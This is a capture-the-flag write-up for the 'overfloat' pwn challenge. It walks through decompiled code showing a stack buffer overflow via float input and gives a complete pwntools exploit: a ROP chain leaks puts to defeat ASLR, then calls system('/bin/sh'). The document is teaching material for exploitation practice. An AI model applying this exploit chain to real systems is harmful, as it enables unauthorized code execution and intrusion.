# overfloat (pwn)

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/09502d7e-8804-475d-ae92-0c3d3a3b5c22)  

Running the program, it prints a pretty banner and then asks for directions.
We're going on a ballon trip!  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/5b95a6ea-95dd-4b7d-b6b7-059b7a54a3e5)  

Let's look at it in ghidra to see what is going on  

```c
undefined8 main(void)
{
  float buf [12];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  alarm(0x1e);
  __sysv_signal(0xe,timeout);
  puts(
      "                                 _ .--.        \n                                ( `    )       \n                             .-\'      `--,     \n                  _..----.. (             )`-. \n                .\'_|` _|` _|(  .__,           )\n               /_|  _|  _|  _(        (_,  .-\' \n              ;|  _|  _|  _|  \'-\'__,--\'`--\'    \n              | _|  _|  _ |  _| |               \n          _   ||  _|  _|  _|  _|               \n        _( `--.\\_|  _|  _|  _|/               \n     .-\'       )--,|  _|  _|.`                 \n    (__, (_      ) )_|  _| /                   \n      `-.__.\\ _,--\'\\|__|__/                  \n                    ;____;                     \n                     \\YT/                     \n                      ||                       \n                     |\"\"|                    \n                     \'==\'                      \n\nWHERE WOULD YOU LIKE TO GO?"
      );
  memset(buf,0,40);
  chart_course(buf);
  puts("BON VOYAGE!");
  return 0
}
```
The only interesting thing in the main function is there is a 48 byte buffer, and that buffer is being passed to `char_course()`.  
It is not initially obvious what that buffer contains, but I've retyped it to contain `float` types for reasons we will see later.  

Let's look at `chart_course`  

```c

void chart_course(float *vuln)

{
  int strncmp_res;
  double dVar1;
  char buf [104];
  float input_asfloat;
  uint i;
  
  i = 0;
  do {
    if ((i & 1) == 0) {
      strncmp_res = (int)i / 2;
      printf("LAT[%d]: ",
             (ulong)(uint)(strncmp_res +
                          ((strncmp_res / 10 + ((int)(i - ((int)i >> 0x1f)) >> 0x1f)) -
                          (strncmp_res >> 0x1f)) * -10));
    }
    else {
      strncmp_res = (int)i / 2;
      printf("LON[%d]: ",
             (ulong)(uint)(strncmp_res +
                          ((strncmp_res / 10 + ((int)(i - ((int)i >> 0x1f)) >> 0x1f)) -
                          (strncmp_res >> 0x1f)) * -10));
    }
    fgets(buf,100,stdin);
    strncmp_res = strncmp(buf,"done",4);
    if (strncmp_res == 0) {
      if ((i & 1) == 0) {
        return;
      }
      puts("WHERES THE LONGITUDE?");
      i = i - 1;
    }
    else {
      dVar1 = atof(buf);
      input_asfloat = (float)dVar1;
      memset(buf,0,100);
      vuln[(int)i] = input_asfloat;
    }
    i = i + 1;
  } while( true );
```

Things to point out:
- there is another buffer, but we are using fgets properly so that buffer is not vulnerable.
- `atof()` is argument to float, so our input will be interpreted as a float.
- we write until we input the string `done`
- out input is written to the passed buffer of 48 bytes

With this, we can tell that we can just not send the `done` string and keep writing into memory, effectively a buffer overflow.  

## Exploitation  
The first thing we need to do, is figure out how to write specific bytes to memory.  
Since our arguments will be interpreted as floats, we can just take the bytes we want, transform them to a floating point number, and then send that number.  
```python
def bytes_to_float(b):
    _ = struct.unpack('f', b)[0]
    return bytes(str(_),'ascii')
```

However, floats are 4 bytes, whereas we are in a 64 bit architecture. So we can separate qwords into lower and higher bits and send them separately.  
```python
def write_qword(b, io = io):
    upper = (b >> 32) & 0xffffffff
    lower = b & 0xffffffff

    s_upper = bytes_to_float(p32(upper))
    s_lower = bytes_to_float(p32(lower))

    io.sendline(s_lower)
    io.sendline(s_upper)
```

Ghidra tells us that our buffer is 56 bytes away from the return address, or 14 floats worth of data.  
Then we can do standard ROP to leak the address of `puts`, bypass ASLR and then perform `ret2system`.  
Same technique as in [svc](https://github.com/AndreQuimper/Writeups/blob/main/Nightmare/2.Stack_Buffer_Overflows/DynamicLinking/csawquals17_svc.md).  

Additionally, I was feeling generous so I decided to call `exit(0)` after the call to `system` so that the program does not crash.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template overfloat
from pwn import *
import struct
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'overfloat')
libc = ELF('libc-2.27.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

io = start()

def bytes_to_float(b):
    _ = struct.unpack('f', b)[0]
    return bytes(str(_),'ascii')


def write_qword(b, io = io):
    upper = (b >> 32) & 0xffffffff
    lower = b & 0xffffffff

    s_upper = bytes_to_float(p32(upper))
    s_lower = bytes_to_float(p32(lower))

    io.sendline(s_lower)
    io.sendline(s_upper)

# padding until return address
floats_to_pad = 14

for i in range(floats_to_pad//2): # since we are writing quadwords we write two floats per iteration
    write_qword(0x4141414141414141)

# rop to perform got leak
rop = ROP(exe)
POP_RDI = rop.find_gadget(['pop rdi','ret'])[0]

write_qword(POP_RDI)
write_qword(exe.got['puts'])
write_qword(exe.plt['puts']) # call puts@plt to print puts@got
write_qword(exe.sym['main']) # jump back to main

io.sendline(b'done') # execute ret

io.recvuntil(b'BON VOYAGE!\n')
leak = int.from_bytes(io.recvline()[:-1],'little')
log.success('puts @ '+hex(leak))


# rop to perform ret2system
libc.address = leak - libc.sym['puts']
binsh = next(libc.search(b'/bin/sh'))
ret = rop.find_gadget(['ret'])[0]


for i in range(floats_to_pad//2): # since we are writing quadwords we write two floats per iteration
    write_qword(0x4141414141414141)

write_qword(ret)
write_qword(POP_RDI)
write_qword(binsh)
write_qword(libc.sym['system']) # execute system('/bin/sh')

write_qword(POP_RDI) # make the program exit gracefully
write_qword(0)
write_qword(libc.sym['exit']) # so program doesn't crash

io.sendline(b'done')

io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/4b0c70be-a655-403b-915c-f4ba5d3c6cc7)


